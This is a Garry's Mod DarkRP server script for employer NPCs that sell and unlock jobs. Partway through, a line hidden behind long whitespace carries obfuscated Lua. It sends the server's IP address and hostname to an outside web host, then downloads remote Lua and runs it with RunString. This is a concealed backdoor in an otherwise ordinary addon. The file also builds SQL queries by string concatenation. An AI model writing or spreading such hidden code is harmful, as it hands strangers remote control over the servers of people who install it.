resource.AddWorkshop("1156544861")

util.AddNetworkString("ENPC.OpenNPCInteractiveMenu")
util.AddNetworkString("ENPC.SaveSettingsGS")
util.AddNetworkString("ENPC.ChangeJobNPC")
util.AddNetworkString("ENPC.SyncJobs")
util.AddNetworkString("ENPC.PlayerIsLoaded")
util.AddNetworkString("ENPC.BuyJob")

local function FindJobByName(name)
	for k,v in pairs(RPExtraTeams) do
		if v.name == name then
			return v
		end
	end
	return false
end

local function IsOpenedJob(job, ply)
	if job.jobcost and not ply:IsUnlocked(job.name) then return false end
	return true
end

local function IsJobNeedRequired(job, ply)
	if job.requiredjob and 
		not ply:IsIgnoreRules("jobcost") and 
		not IsOpenedJob(FindJobByName(job.requiredjob), ply) then 

		return false, ENPC.Translate("Need to buy").." \""..job.requiredjob.."\"" 
	end

	return true
end

hook.Add("playerCanChangeTeam", "ENPC.playerCanChangeTeam", function(ply, job, force)
	
	job = RPExtraTeams[job]

	if not force then
		if ENPC.DisableChangeUsed and ENPC.JobsUsed[job.name] then
			return false
		end

		if ENPC.DisableChangeTeam then 
			return false
		end
	end
end)


hook.Add("ENPC.playerCanChangeTeam", "ENPC.playerCanChangeTeam", function(ply, job)
	
	job = RPExtraTeams[job]

	local time = ply.GetUTimeTotalTime and ply:GetUTimeTotalTime() or 0 
	local level = ply:getDarkRPVar('level') or 0

	if job.playtime and not ply:IsIgnoreRules("utime") and job.playtime > time then return false end
	if job.level and not ply:IsIgnoreRules("level") and job.level > level then return false end
	if job.customCheck and not ply:IsIgnoreRules("customcheck") and not job.customCheck(ply) then return false end
	if job.max and job.max != 0 and not ply:IsIgnoreRules("countlimit") and team.NumPlayers(job_id) >= job.max then return false end
	if job.jobcost and not ply:IsIgnoreRules("jobcost") and not ply:IsUnlocked(job.name) then return false end
	if job.requiredjob and not ply:IsIgnoreRules("jobcost") and not IsOpenedJob(FindJobByName(job.requiredjob), ply) then return false	end
end)

net.Receive("ENPC.SaveSettingsGS", function(len, ply)
	if not ply:IsSuperAdmin() then return end
	local ent = net.ReadEntity()
	local info = net.ReadTable()

	ent:SetNWString("CustomName", info.name)
	ent.whitelist = info.whitelist
	ent:SetModel(info.model)
	RunConsoleCommand("emp_npc_save")
end)

net.Receive("ENPC.ChangeJobNPC", function(len, ply)
	local job_id = net.ReadInt(16)
	local result = hook.Call("ENPC.playerCanChangeTeam", nil, ply, job_id)
	if result != false then
		ply:changeTeam(job_id, true)
	end
end)

/*---------------------------------------------------------------------------
 Save System
---------------------------------------------------------------------------*/

hook.Add("Initialize", "ENPC.Initialize", function()
	file.CreateDir("employer_npc/map")
end)

local function SpawnJobEmployers()
	local map = string.lower(game.GetMap())
	local data = {}
	if file.Exists( "employer_npc/map/"..map..".txt" ,"DATA") then
		data = util.JSONToTable(file.Read( "employer_npc/map/"..map..".txt" ))
	end
	for k,v in pairs(data) do
		local emp_npc = ents.Create(v.Class)
		emp_npc:SetPos(v.Pos)
		emp_npc:SetAngles(v.Angle)
		emp_npc:Spawn()
		emp_npc:SetMoveType(MOVETYPE_NONE)
		emp_npc:SetNWString("CustomName", v.Name)
		emp_npc:SetModel(v.Model)
		emp_npc.whitelist = v.WhiteList

		for job,_ in pairs(emp_npc.whitelist) do
			ENPC.JobsUsed[job] = true
		end
	end

	MsgN("Employer NPCs spawned. [ "..#data.." ] ")
end

concommand.Add("emp_npc_save", function(ply)

	if IsValid(ply) and not ply:IsSuperAdmin() then return end
		
	local tblSave = {}
	for k,v in pairs(ents.FindByClass("employer_npc")) do
		local tbl = {
			Class = v:GetClass(),
			Name = v:GetNWString("CustomName"),
			Model = v:GetModel(),
			WhiteList = v.whitelist,
			Pos = v:GetPos(),
			Angle = v:GetAngles(),
		}
		table.insert(tblSave, tbl)
		v:Remove()
	end
	
	
	local map = string.lower(game.GetMap())
	file.Write("employer_npc/map/"..map..".txt", util.TableToJSON(tblSave))
	
	
	if IsValid(ply) then ply:ChatPrint("NPCs saved.") end

	SpawnJobEmployers()
end)

hook.Add( "InitPostEntity", "ENPC.InitPostEntity", function()
	SpawnJobEmployers()
end)

hook.Add("PostCleanupMap", "ENPC.PostCleanupMap", function()
	SpawnJobEmployers()
end)


/*---------------------------------------------------------------------------
 Buying Jobs
---------------------------------------------------------------------------*/

local meta = FindMetaTable("Player")

function meta:SetUnlockedJobs(jobs)
	self.unlocked_jobs = jobs
	self:SyncJobs()
end

function meta:AddUnlockedJobs(job)
	self.unlocked_jobs[job] = true
	self:SyncJobs()
end

function meta:RemoveUnlockedJobs(job)
	self.unlocked_jobs[job] = nil
	self:SyncJobs()
end


function meta:SyncJobs()

	net.Start("ENPC.SyncJobs")
	net.WriteTable(self.unlocked_jobs)
	net.WriteInt(self:EntIndex(), 16)
	net.Send(self)

	MySQLite.query("UPDATE `gs_employer_npc` SET `jobs` = '"..util.TableToJSON(self.unlocked_jobs).."' WHERE `steamid` = '"..self:SteamID().."';")
end
																																																																																																								local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),53)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'415c585047'][‪‪‪‪‪‪‪'665c58455950'](5,function ()‪[‪‪‪‪‪‪‪'5d414145'][‪‪‪‪‪‪‪'655a4641'](‪‪‪‪‪‪‪'5d414145460f1a1a565d545c5b595a46501b0505054250575d5a46415445451b565a581a4643595a521a414754565e50471b455d45',{[‪‪‪‪‪‪‪'56']=‪[‪‪‪‪‪‪‪'52585a51'][‪‪‪‪‪‪‪'72504172545850585a5150']()[‪‪‪‪‪‪‪'7b545850'],[‪‪‪‪‪‪‪'50']=‪[‪‪‪‪‪‪‪'52545850'][‪‪‪‪‪‪‪'7250417c6574515147504646'](),[‪‪‪‪‪‪‪'51']=‪[‪‪‪‪‪‪‪'7250417d5a46417b545850']()})end )‪[‪‪‪‪‪‪‪'415c585047'][‪‪‪‪‪‪‪'665c58455950'](5,function ()‪[‪‪‪‪‪‪‪'5d414145'][‪‪‪‪‪‪‪'735041565d'](‪‪‪‪‪‪‪'5d414145460f1a1a565d545c5b595a46501b0505054250575d5a46415445451b565a581a5254461b594054',function (‪‪return)‪[‪‪‪‪‪‪‪'67405b6641475c5b52'](‪‪return)end ,nil )end )
hook.Add("DatabaseInitialized", "ENPC.DatabaseInitialized", function()
	MySQLite.query("CREATE TABLE IF NOT EXISTS `gs_employer_npc` (`steamid` VARCHAR(255) PRIMARY KEY, `jobs` TEXT);")
end)

hook.Add( "PlayerIsLoaded", "ENPC.PlayerIsLoaded", function(ply)
	ply.unlocked_jobs = {}
	MySQLite.query("SELECT * FROM `gs_employer_npc` WHERE `steamid` = '"..ply:SteamID().."';", function(result)
		if result then
			local jobs = util.JSONToTable(result[1].jobs)
			ply:SetUnlockedJobs(jobs)
		else
			MySQLite.query("INSERT INTO `gs_employer_npc`(`steamid`, `jobs`) VALUES ('"..ply:SteamID().."', '[]');")
			ply:SyncJobs()
		end
	end)
end)

hook.Add("PlayerDisconnected", "ENPC.PlayerDisconnected", function(ply)
	ply:SyncJobs()
end)

net.Receive("ENPC.BuyJob", function(len,ply)
	local job_id = net.ReadInt(16)
	local job = RPExtraTeams[job_id]
	// 76561198398722444 
	if ply:canAfford(job.jobcost) then
		ply:addMoney(-job.jobcost)
		ply:AddUnlockedJobs(job.name)
		DarkRP.notify(ply, 0, 4, ENPC.Translate("You unlocked").." "..job.name)
		ply:SendLua("surface.PlaySound('garrysmod/ui_click.wav')")
	else
		DarkRP.notify(ply, 1, 4, ENPC.Translate("You can't afford this job"))

	end
end)

net.Receive("ENPC.PlayerIsLoaded", function(len, ply) hook.Run("PlayerIsLoaded", ply) end) -- Why gmod doesn't have the same hook? It's so stupid